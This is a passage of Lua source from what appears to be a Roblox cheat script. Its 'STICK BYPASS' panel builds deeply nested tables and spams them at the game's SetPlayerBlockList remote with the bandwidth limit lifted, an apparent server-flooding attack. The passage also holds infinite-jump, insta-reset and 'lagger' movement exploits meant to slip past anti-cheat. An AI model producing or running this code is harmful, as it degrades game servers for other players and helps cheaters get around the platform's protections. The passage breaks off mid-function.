M.bypassRunning = false
M.bypassSpamThread = nil
M.bypassBomb = nil
M.bypassMode = "PC" -- PC | Mobile
M.bypassKeybindName = "V"
M.bypassPCPower = 97000
M.bypassMobilePower = 72000
M._bypassKeyConn = nil
M._bypassListeningKey = false
M.BYPASS_DEPTH = 296
M.BYPASS_SPAM_DELAY = 0.12

local function M_bypassBuildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, M.BYPASS_DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (M.BYPASS_DEPTH + 2))
    for _ = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

function M.stopBypassSpam()
    M.bypassRunning = false
    if M.bypassSpamThread then
        pcall(function() task.cancel(M.bypassSpamThread) end)
        M.bypassSpamThread = nil
    end
    M.bypassBomb = nil
    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
end

function M.startBypassSpam()
    M.stopBypassSpam()
    M.bypassRunning = true
    local power = (M.bypassMode == "PC") and M.bypassPCPower or M.bypassMobilePower
    M.bypassBomb = M_bypassBuildBomb(power)
    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
    M.bypassSpamThread = task.spawn(function()
        while M.bypassRunning do
            if M.bypassBomb then
                pcall(function()
                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(M.bypassBomb)
                end)
            end
            task.wait(M.BYPASS_SPAM_DELAY)
        end
    end)
end

function M.destroyBypassUI()
    M.stopBypassSpam()
    if M._bypassKeyConn then
        pcall(function() M._bypassKeyConn:Disconnect() end)
        M._bypassKeyConn = nil
    end
    if M.bypassGui then
        pcall(function() M.bypassGui:Destroy() end)
        M.bypassGui = nil
    end
    M._bypassListeningKey = false
end

function M.buildBypassUI()
    M.destroyBypassUI()

    local ORANGE = Color3.fromRGB(255, 150, 0)
    local ORANGE_DIM = Color3.fromRGB(200, 100, 0)

    local gui = Instance.new("ScreenGui")
    gui.Name = "STICK BYPASS"
    gui.ResetOnSpawn = false
    pcall(function()
        if gethui then gui.Parent = gethui()
        else gui.Parent = game:GetService("CoreGui") end
    end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
    M.bypassGui = gui

    local MainFrame = Instance.new("Frame")
    MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
    MainFrame.BackgroundTransparency = 0.15
    MainFrame.Position = UDim2.new(0.5, -130, 0.45, -120)
    MainFrame.Size = UDim2.new(0, 260, 0, 240)
    MainFrame.ClipsDescendants = true
    MainFrame.Parent = gui
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)
    local MainStroke = Instance.new("UIStroke", MainFrame)
    MainStroke.Color = ORANGE
    MainStroke.Thickness = 1.2
    MainStroke.Transparency = 0.5

    local GlowFrame = Instance.new("Frame", MainFrame)
    GlowFrame.Size = UDim2.new(1, 0, 1, 0)
    GlowFrame.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
    GlowFrame.BackgroundTransparency = 0.95
    GlowFrame.BorderSizePixel = 0
    Instance.new("UICorner", GlowFrame).CornerRadius = UDim.new(0, 16)

    local Header = Instance.new("Frame")
    Header.BackgroundTransparency = 1
    Header.Size = UDim2.new(1, 0, 0, 55)
    Header.Parent = MainFrame

    local Title = Instance.new("TextLabel", Header)
    Title.BackgroundTransparency = 1
    Title.Position = UDim2.new(0, 15, 0, 0)
    Title.Size = UDim2.new(0.5, -15, 1, 0)
    Title.Font = Enum.Font.GothamBlack
    Title.Text = "STICK BYPASS"
    Title.TextColor3 = ORANGE
    Title.TextSize = 16
    Title.TextXAlignment = Enum.TextXAlignment.Left

    local Subtitle = Instance.new("TextLabel", Header)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Position = UDim2.new(0, 15, 0, 28)
    Subtitle.Size = UDim2.new(0.5, -15, 0, 15)
    Subtitle.Font = Enum.Font.Gotham
    Subtitle.Text = "bypass tool"
    Subtitle.TextColor3 = Color3.fromRGB(100, 100, 130)
    Subtitle.TextSize = 9
    Subtitle.TextXAlignment = Enum.TextXAlignment.Left

    local ModeSwitchBtn = Instance.new("TextButton", Header)
    ModeSwitchBtn.Position = UDim2.new(0.55, 0, 0.5, -14)
    ModeSwitchBtn.Size = UDim2.new(0, 85, 0, 28)
    ModeSwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    ModeSwitchBtn.Font = Enum.Font.GothamBold
    ModeSwitchBtn.Text = (M.bypassMode == "PC") and "PC" or "MOBILE"
    ModeSwitchBtn.TextColor3 = ORANGE
    ModeSwitchBtn.TextSize = 12
    ModeSwitchBtn.AutoButtonColor = false
    Instance.new("UICorner", ModeSwitchBtn).CornerRadius = UDim.new(0, 20)
    local ModeStroke = Instance.new("UIStroke", ModeSwitchBtn)
    ModeStroke.Color = Color3.fromRGB(200, 120, 0)
    ModeStroke.Thickness = 1

    local ContentFrame = Instance.new("ScrollingFrame")
    ContentFrame.Parent = MainFrame
    ContentFrame.BackgroundTransparency = 1
    ContentFrame.Position = UDim2.new(0, 10, 0, 60)
    ContentFrame.Size = UDim2.new(1, -20, 1, -70)
    ContentFrame.ScrollBarThickness = 3
    ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 120, 0)
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ContentFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

    local Container = Instance.new("Frame")
    Container.Parent = ContentFrame
    Container.BackgroundTransparency = 1
    Container.Size = UDim2.new(1, 0, 0, 0)
    Container.AutomaticSize = Enum.AutomaticSize.Y
    local UIList = Instance.new("UIListLayout", Container)
    UIList.SortOrder = Enum.SortOrder.LayoutOrder
    UIList.Padding = UDim.new(0, 10)

    -- PC MODE
    local PCElements = Instance.new("Frame", Container)
    PCElements.Size = UDim2.new(1, 0, 0, 0)
    PCElements.AutomaticSize = Enum.AutomaticSize.Y
    PCElements.BackgroundTransparency = 1
    PCElements.Visible = M.bypassMode == "PC"
    local PCUIList = Instance.new("UIListLayout", PCElements)
    PCUIList.SortOrder = Enum.SortOrder.LayoutOrder
    PCUIList.Padding = UDim.new(0, 8)

    local PCCard = Instance.new("Frame", PCElements)
    PCCard.Size = UDim2.new(1, 0, 0, 45)
    PCCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    PCCard.BackgroundTransparency = 0.5
    Instance.new("UICorner", PCCard).CornerRadius = UDim.new(0, 12)
    local PCCardStroke = Instance.new("UIStroke", PCCard)
    PCCardStroke.Color = ORANGE_DIM
    PCCardStroke.Thickness = 0.5

    local PCToggleBtn = Instance.new("TextButton", PCCard)
    PCToggleBtn.Size = UDim2.new(1, -20, 1, -10)
    PCToggleBtn.Position = UDim2.new(0, 10, 0, 5)
    PCToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    PCToggleBtn.Font = Enum.Font.GothamBold
    PCToggleBtn.Text = "DISABLED"
    PCToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
    PCToggleBtn.TextSize = 13
    PCToggleBtn.AutoButtonColor = false
    Instance.new("UICorner", PCToggleBtn).CornerRadius = UDim.new(0, 8)

    local PCKeyCard = Instance.new("Frame", PCElements)
    PCKeyCard.Size = UDim2.new(1, 0, 0, 35)
    PCKeyCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    PCKeyCard.BackgroundTransparency = 0.5
    Instance.new("UICorner", PCKeyCard).CornerRadius = UDim.new(0, 12)
    local PCKeyStroke = Instance.new("UIStroke", PCKeyCard)
    PCKeyStroke.Color = ORANGE_DIM
    PCKeyStroke.Thickness = 0.5

    local PCKeyLabel = Instance.new("TextLabel", PCKeyCard)
    PCKeyLabel.Size = UDim2.new(0.5, -10, 1, 0)
    PCKeyLabel.Position = UDim2.new(0, 10, 0, 0)
    PCKeyLabel.BackgroundTransparency = 1
    PCKeyLabel.Font = Enum.Font.Gotham
    PCKeyLabel.Text = "Keybind"
    PCKeyLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
    PCKeyLabel.TextSize = 11
    PCKeyLabel.TextXAlignment = Enum.TextXAlignment.Left

    local PCKeybindBtn = Instance.new("TextButton", PCKeyCard)
    PCKeybindBtn.Position = UDim2.new(0.65, 0, 0.5, -10)
    PCKeybindBtn.Size = UDim2.new(0, 60, 0, 20)
    PCKeybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    PCKeybindBtn.Font = Enum.Font.GothamBold
    PCKeybindBtn.Text = M.bypassKeybindName
    PCKeybindBtn.TextColor3 = ORANGE
    PCKeybindBtn.TextSize = 11
    Instance.new("UICorner", PCKeybindBtn).CornerRadius = UDim.new(0, 6)

    local PCPowerCard = Instance.new("Frame", PCElements)
    PCPowerCard.Size = UDim2.new(1, 0, 0, 35)
    PCPowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    PCPowerCard.BackgroundTransparency = 0.5
    Instance.new("UICorner", PCPowerCard).CornerRadius = UDim.new(0, 12)
    local PCPowerStroke = Instance.new("UIStroke", PCPowerCard)
    PCPowerStroke.Color = ORANGE_DIM
    PCPowerStroke.Thickness = 0.5

    local PCPowerLabel = Instance.new("TextLabel", PCPowerCard)
    PCPowerLabel.Size = UDim2.new(0.5, -10, 1, 0)
    PCPowerLabel.Position = UDim2.new(0, 10, 0, 0)
    PCPowerLabel.BackgroundTransparency = 1
    PCPowerLabel.Font = Enum.Font.Gotham
    PCPowerLabel.Text = "Power"
    PCPowerLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
    PCPowerLabel.TextSize = 11
    PCPowerLabel.TextXAlignment = Enum.TextXAlignment.Left

    local PCPowerInput = Instance.new("TextBox", PCPowerCard)
    PCPowerInput.Position = UDim2.new(0.65, 0, 0.5, -10)
    PCPowerInput.Size = UDim2.new(0, 70, 0, 20)
    PCPowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    PCPowerInput.Font = Enum.Font.GothamBold
    PCPowerInput.Text = tostring(M.bypassPCPower)
    PCPowerInput.TextColor3 = ORANGE
    PCPowerInput.TextSize = 10
    PCPowerInput.ClearTextOnFocus = false
    Instance.new("UICorner", PCPowerInput).CornerRadius = UDim.new(0, 6)

    local PCFooter = Instance.new("TextLabel", PCElements)
    PCFooter.BackgroundTransparency = 1
    PCFooter.Size = UDim2.new(1, 0, 0, 20)
    PCFooter.Font = Enum.Font.Gotham
    PCFooter.Text = "v2 • " .. tostring(M.bypassPCPower) .. " power"
    PCFooter.TextColor3 = Color3.fromRGB(80, 80, 100)
    PCFooter.TextSize = 9

    -- MOBILE MODE
    local MobileElements = Instance.new("Frame", Container)
    MobileElements.Size = UDim2.new(1, 0, 0, 0)
    MobileElements.AutomaticSize = Enum.AutomaticSize.Y
    MobileElements.BackgroundTransparency = 1
    MobileElements.Visible = M.bypassMode == "Mobile"
    local MobileUIList = Instance.new("UIListLayout", MobileElements)
    MobileUIList.SortOrder = Enum.SortOrder.LayoutOrder
    MobileUIList.Padding = UDim.new(0, 8)

    local MobileCard = Instance.new("Frame", MobileElements)
    MobileCard.Size = UDim2.new(1, 0, 0, 45)
    MobileCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    MobileCard.BackgroundTransparency = 0.5
    Instance.new("UICorner", MobileCard).CornerRadius = UDim.new(0, 12)

    local MobileToggleBtn = Instance.new("TextButton", MobileCard)
    MobileToggleBtn.Size = UDim2.new(1, -20, 1, -10)
    MobileToggleBtn.Position = UDim2.new(0, 10, 0, 5)
    MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    MobileToggleBtn.Font = Enum.Font.GothamBold
    MobileToggleBtn.Text = "OFF"
    MobileToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
    MobileToggleBtn.TextSize = 13
    MobileToggleBtn.AutoButtonColor = false
    Instance.new("UICorner", MobileToggleBtn).CornerRadius = UDim.new(0, 8)

    local MobilePowerCard = Instance.new("Frame", MobileElements)
    MobilePowerCard.Size = UDim2.new(1, 0, 0, 35)
    MobilePowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    MobilePowerCard.BackgroundTransparency = 0.5
    Instance.new("UICorner", MobilePowerCard).CornerRadius = UDim.new(0, 12)

    local MobilePowerLabel = Instance.new("TextLabel", MobilePowerCard)
    MobilePowerLabel.Size = UDim2.new(0.5, -10, 1, 0)
    MobilePowerLabel.Position = UDim2.new(0, 10, 0, 0)
    MobilePowerLabel.BackgroundTransparency = 1
    MobilePowerLabel.Font = Enum.Font.Gotham
    MobilePowerLabel.Text = "Power"
    MobilePowerLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
    MobilePowerLabel.TextSize = 11
    MobilePowerLabel.TextXAlignment = Enum.TextXAlignment.Left

    local MobilePowerInput = Instance.new("TextBox", MobilePowerCard)
    MobilePowerInput.Position = UDim2.new(0.65, 0, 0.5, -10)
    MobilePowerInput.Size = UDim2.new(0, 70, 0, 20)
    MobilePowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    MobilePowerInput.Font = Enum.Font.GothamBold
    MobilePowerInput.Text = tostring(M.bypassMobilePower)
    MobilePowerInput.TextColor3 = ORANGE
    MobilePowerInput.TextSize = 10
    MobilePowerInput.ClearTextOnFocus = false
    Instance.new("UICorner", MobilePowerInput).CornerRadius = UDim.new(0, 6)

    local MobileFooter = Instance.new("TextLabel", MobileElements)
    MobileFooter.BackgroundTransparency = 1
    MobileFooter.Size = UDim2.new(1, 0, 0, 20)
    MobileFooter.Font = Enum.Font.Gotham
    MobileFooter.Text = "v2 • " .. tostring(M.bypassMobilePower) .. " power"
    MobileFooter.TextColor3 = Color3.fromRGB(80, 80, 100)
    MobileFooter.TextSize = 9

    local function updateToggleVisuals(enabled)
        if M.bypassMode == "PC" then
            if enabled then
                PCToggleBtn.Text = "ENABLED"
                PCToggleBtn.TextColor3 = Color3.fromRGB(255, 200, 50)
                PCCardStroke.Color = ORANGE
                MainStroke.Transparency = 0
                ModeStroke.Color = ORANGE
            else
                PCToggleBtn.Text = "DISABLED"
                PCToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
                PCCardStroke.Color = ORANGE_DIM
                MainStroke.Transparency = 0.5
                ModeStroke.Color = Color3.fromRGB(200, 120, 0)
            end
        else
            if enabled then
                MobileToggleBtn.Text = "ON"
                MobileToggleBtn.TextColor3 = Color3.fromRGB(255, 200, 50)
                MainStroke.Transparency = 0
                ModeStroke.Color = ORANGE
            else
                MobileToggleBtn.Text = "OFF"
                MobileToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 180)
                MainStroke.Transparency = 0.5
                ModeStroke.Color = Color3.fromRGB(200, 120, 0)
            end
        end
    end

    local function toggleBypass()
        if M.bypassRunning then
            M.stopBypassSpam()
        else
            M.startBypassSpam()
        end
        updateToggleVisuals(M.bypassRunning)
    end

    local function switchMode()
        if M.bypassRunning then
            M.stopBypassSpam()
            updateToggleVisuals(false)
        end
        M.bypassMode = (M.bypassMode == "PC") and "Mobile" or "PC"
        PCElements.Visible = M.bypassMode == "PC"
        MobileElements.Visible = M.bypassMode == "Mobile"
        ModeSwitchBtn.Text = (M.bypassMode == "PC") and "PC" or "MOBILE"
        PCFooter.Text = "v2 • " .. tostring(M.bypassPCPower) .. " power"
        MobileFooter.Text = "v2 • " .. tostring(M.bypassMobilePower) .. " power"
        pcall(saveCherryConfig)
    end

    PCToggleBtn.MouseButton1Click:Connect(function()
        if M.bypassMode == "PC" then toggleBypass() end
    end)
    MobileToggleBtn.MouseButton1Click:Connect(function()
        if M.bypassMode == "Mobile" then toggleBypass() end
    end)
    ModeSwitchBtn.MouseButton1Click:Connect(switchMode)

    PCPowerInput.FocusLost:Connect(function()
        local n = tonumber(PCPowerInput.Text)
        if n then
            M.bypassPCPower = math.clamp(n, 10000, 150000)
        else
            M.bypassPCPower = 97000
        end
        PCPowerInput.Text = tostring(M.bypassPCPower)
        PCFooter.Text = "v2 • " .. tostring(M.bypassPCPower) .. " power"
        pcall(saveCherryConfig)
        if M.bypassRunning and M.bypassMode == "PC" then M.startBypassSpam() end
    end)

    MobilePowerInput.FocusLost:Connect(function()
        local n = tonumber(MobilePowerInput.Text)
        if n then
            M.bypassMobilePower = math.clamp(n, 10000, 100000)
        else
            M.bypassMobilePower = 72000
        end
        MobilePowerInput.Text = tostring(M.bypassMobilePower)
        MobileFooter.Text = "v2 • " .. tostring(M.bypassMobilePower) .. " power"
        pcall(saveCherryConfig)
        if M.bypassRunning and M.bypassMode == "Mobile" then M.startBypassSpam() end
    end)

    PCKeybindBtn.MouseButton1Click:Connect(function()
        M._bypassListeningKey = true
        PCKeybindBtn.Text = "..."
        PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
    end)

    M._bypassKeyConn = UIS.InputBegan:Connect(function(input, processed)
        if processed then return end
        if M._bypassListeningKey then
            if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
                M.bypassKeybindName = input.KeyCode.Name
                PCKeybindBtn.Text = M.bypassKeybindName
                PCKeybindBtn.TextColor3 = ORANGE
                M._bypassListeningKey = false
                pcall(saveCherryConfig)
            end
            return
        end
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == M.bypassKeybindName then
            if M.bypassMode == "PC" then toggleBypass() end
        end
    end)

    do
        local dragging, dragStart, startPos
        Header.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = MainFrame.Position
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragStart
                MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end

    updateToggleVisuals(false)
end

function M.setBypassPanel(on)
    on = on and true or false
    M.bypassPanelEnabled = on
    if on then
        M.buildBypassUI()
    else
        M.destroyBypassUI()
        M.bypassPanelEnabled = false
    end
    if M.setBypassPanelVisual then M.setBypassPanelVisual(M.bypassPanelEnabled) end
    pcall(saveCherryConfig)
end

-- ============================================================
-- INFINITE JUMP (JumpRequest) + HOLD JUMP (hold space)
-- ============================================================
M.jumpHeld = false
M.infJumpThread = nil
M.holdInfJumpConn = nil
M._holdJumpSpace = false

-- Infinity Jump seguro (sin ChangeState / sin doble velocity que te mata)
M._infJumpLast = 0
M.INF_JUMP_FORCE = 50
M.INF_JUMP_COOLDOWN = 0.12
UIS.JumpRequest:Connect(function()
    if not M.infJumpEnabled then return end
    local now = tick()
    if now - (M._infJumpLast or 0) < M.INF_JUMP_COOLDOWN then return end
    M._infJumpLast = now
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not root or not hum or hum.Health <= 0 then return end
    pcall(function()
        local v = root.AssemblyLinearVelocity
        -- Solo impulso si no vas ya muy arriba (evita volar al void / anti-cheat kill)
        if v.Y < M.INF_JUMP_FORCE then
            root.AssemblyLinearVelocity = Vector3.new(v.X, M.INF_JUMP_FORCE, v.Z)
        end
    end)
end)

-- Hold Jump: detectar Space / touch hold
UIS.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if inp.KeyCode == Enum.KeyCode.Space or inp.UserInputType == Enum.UserInputType.Touch then
        M._holdJumpSpace = true
        M.jumpHeld = true
    end
end)
UIS.InputEnded:Connect(function(inp)
    if inp.KeyCode == Enum.KeyCode.Space or inp.UserInputType == Enum.UserInputType.Touch then
        M._holdJumpSpace = false
        M.jumpHeld = false
    end
end)

function M.startManualInfJumpLoop()
    -- no loop needed: JumpRequest handles Infinity Jump
end

function M.stopManualInfJumpLoop()
    M.jumpHeld = false
end

function M.startHoldInfJump()
    if M.holdInfJumpConn then
        pcall(function() M.holdInfJumpConn:Disconnect() end)
        M.holdInfJumpConn = nil
    end
    M._holdJumpRoot = nil
    M.holdInfJumpConn = RunService.Heartbeat:Connect(function()
        if not M.holdJumpEnabled then return end
        if not (M._holdJumpSpace or M.jumpHeld) then return end
        local root = M._holdJumpRoot
        if not root or not root.Parent then
            local char = player.Character
            root = char and char:FindFirstChild("HumanoidRootPart")
            M._holdJumpRoot = root
            if not root then return end
        end
        local v = root.AssemblyLinearVelocity
        -- Hold mas suave: no spamear 55 cada frame si ya subes
        if v.Y < 40 then
            root.AssemblyLinearVelocity = Vector3.new(v.X, 48, v.Z)
        end
    end)
end

function M.stopHoldInfJump()
    if M.holdInfJumpConn then
        pcall(function() M.holdInfJumpConn:Disconnect() end)
        M.holdInfJumpConn = nil
    end
    M._holdJumpSpace = false
    M._holdJumpRoot = nil
end

function M.setHoldJump(on)
    M.holdJumpEnabled = on and true or false
    if M.holdJumpEnabled then
        M.startHoldInfJump()
    else
        M.stopHoldInfJump()
    end
end

-- ============================================================
-- ============================================================
function M.startUnwalk()
    local c=player.Character;if not c then return end;local hum=c:FindFirstChildOfClass("Humanoid")
    if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end
    local anim=c:FindFirstChild("Animate");if anim then M.unwalkSavedAnimate=anim:Clone();anim:Destroy() end
end

function M.stopUnwalk() local c=player.Character;if c and M.unwalkSavedAnimate then M.unwalkSavedAnimate:Clone().Parent=c;M.unwalkSavedAnimate=nil end end

function M.instaReset()
    if M.resetCooldown then return end
    M.resetCooldown = true
    M.resetSuccessful = false
    M.stopResetSequence = false

    local character = player.Character
    if not character then
        M.resetCooldown = false
        return
    end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        M.resetCooldown = false
        return
    end

    M.currentResetCharacter = character
    M.resetOriginalHipHeight = humanoid.HipHeight
    local isRespawning = false

    M.resetThread = task.spawn(function()
        local attempts = 0
        local maxAttempts = 40
        local originalHipHeight = M.resetOriginalHipHeight

        while character and character.Parent and humanoid and humanoid.Health > 0
            and not isRespawning and not M.stopResetSequence do
            if player.Character ~= character then
                isRespawning = true
                break
            end

            pcall(function()
                humanoid.HipHeight = 1e30
                humanoid.AutoRotate = true

                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.CanCollide = false
                end

                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = false
                    end
                end
            end)

            if not character or not character.Parent or not humanoid
                or humanoid.Health <= 0 or player.Character ~= character then
                M.resetSuccessful = true
                break
            end

            attempts = attempts + 1
            if attempts >= maxAttempts then
                break
            end

            task.wait(0.05)
        end

        if not M.resetSuccessful and character and character.Parent and humanoid
            and humanoid.Health > 0 and not isRespawning then
            pcall(function()
                humanoid.Health = 0
            end)
            task.wait(0.1)
            if not character.Parent or humanoid.Health <= 0 then
                M.resetSuccessful = true
            end
        end

        if not M.resetSuccessful and character and character.Parent and humanoid then
            pcall(function()
                humanoid.HipHeight = originalHipHeight or 2
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.CanCollide = true
                end
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = true
                    end
                end
            end)
        end

        M.resetCooldown = false
        M.resetThread = nil
        M.currentResetCharacter = nil
        M.resetOriginalHipHeight = nil
        M.stopResetSequence = false
    end)
end

function M.stopInstaReset()
    M.stopResetSequence = true
    if M.resetThread then
        pcall(function() task.cancel(M.resetThread) end)
        M.resetThread = nil
    end
    M.resetCooldown = false
    M.currentResetCharacter = nil

    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        pcall(function()
            humanoid.HipHeight = M.resetOriginalHipHeight or 2
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.CanCollide = true
            end
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.CanCollide = true
                end
            end
        end)
    end

    M.resetOriginalHipHeight = nil
    M.stopResetSequence = false
end


function M.hasBrainrotInHand()
    local char = player.Character
    if not char then return false end
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("brainrot", 1, true) or name:find("skibidi", 1, true) or name:find("toilet", 1, true) then
                return true
            end
        end
    end
    return false
end

function M.forceLaggerCarryWhileHolding()
    if not M.hasBrainrotInHand() then return false end
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = true
    return true
end

function M.toggleCarryMode()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    M.carrySpeedActive = not M.carrySpeedActive
    if M.carrySpeedActive then M.laggerCarryActive = false end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    saveCherryConfig()
end

function M.toggleLaggerMode()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    M.laggerModeEnabled = not M.laggerModeEnabled
    if M.laggerModeEnabled then M.laggerCarryActive = false end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    saveCherryConfig()
end

function M.cycleLaggerModeBind()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    if not M.laggerCarryActive and not M.laggerModeEnabled then
        M.laggerCarryActive = true
        M.laggerModeEnabled = false
        M.carrySpeedActive = false
    elseif M.laggerCarryActive then
        M.laggerCarryActive = false
        M.laggerModeEnabled = true
    else
        M.laggerModeEnabled = false
        M.laggerCarryActive = true
        M.carrySpeedActive = false
    end

    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
    saveCherryConfig()
end

function M.toggleLaggerCarry()
    M.laggerCarryActive = not M.laggerCarryActive
    if M.laggerCarryActive then
        M.laggerModeEnabled = false
        M.carrySpeedActive = false
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    saveCherryConfig()
end

function M.stopAutoLeft()
    M.autoLeftEnabled = false
